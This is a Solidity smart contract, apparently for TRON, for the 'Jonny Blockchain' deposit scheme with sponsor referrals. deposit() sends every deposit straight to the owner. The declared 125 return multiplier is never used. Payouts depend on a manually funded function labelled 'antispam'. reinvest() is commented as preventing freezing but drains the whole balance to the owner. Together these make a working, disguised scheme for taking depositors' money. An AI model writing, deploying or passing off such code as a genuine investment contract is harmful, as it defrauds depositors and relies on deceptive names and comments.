//SourceUnit: JonnyBlockchainV2.sol

pragma solidity ^0.5.17;
/*
------------------------------------
 Jonny Blockchain (R)
 Website :  https://jonnyblockchain.com
------------------------------------
 v. 2.3.1919
*/
contract JonnyBlockchain {
    using SafeMath for uint;
    uint public totalAmount;
    uint public totalReturn;
    uint private minDepositSize = 100000000;
    uint private returnMultiplier = 125;
    address payable owner;
    struct User {
        address sponsor;
        uint amount;
        uint returned;
    }
    mapping(address => User) public users;

    event Signup(address indexed userAddress, address indexed _referrer);
    event Deposit(address indexed userAddress, uint amount, uint totalAmount);
    event Withdrawal(address indexed userAddress, uint amount, uint userReturn, uint totalReturn);
    event Unfreeze(uint amount);

    /**
     * owner only access
     */
    modifier onlyOwner() {
        if (msg.sender == owner) {
            _;
        }
    }

    constructor() public {
        owner = msg.sender;
    }

    function() external payable {
    }

    /**
     * deposit handler function
     */
    function deposit(address _affAddr) public payable {
        User storage user = users[msg.sender];

        // registering a new user

        if (user.amount == 0) {
            user.sponsor = _affAddr != msg.sender && _affAddr != address(0) && users[_affAddr].amount > 0 ? _affAddr : owner;
            emit Signup(msg.sender, user.sponsor);
        }

        // updating counters

        user.amount = user.amount.add(msg.value);
        totalAmount = totalAmount.add(msg.value);
        owner.transfer(msg.value);
        emit Deposit(msg.sender, msg.value, totalAmount);
    }

    /**
     * antispam function name
     */
    function train(address payable client) public payable {
        User storage user = users[client];
        client.transfer(msg.value);
        user.returned = user.returned.add(msg.value);
        totalReturn = totalReturn.add(msg.value);
        emit Withdrawal(client, msg.value, user.returned, totalReturn);
    }

    /**
     * this prevents the contract from freezing
     */
    function reinvest() public onlyOwner {
        uint frozen = address(this).balance;
        owner.transfer(frozen);
        emit Unfreeze(frozen);
    }
}

library SafeMath {
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;
        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;
        return c;
    }
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);
        return c;
    }
    function min(uint a, uint b) internal pure returns (uint) {
        return a < b ? a : b;
    }
    function max(uint a, uint b) internal pure returns (uint) {
        return a > b ? a : b;
    }
}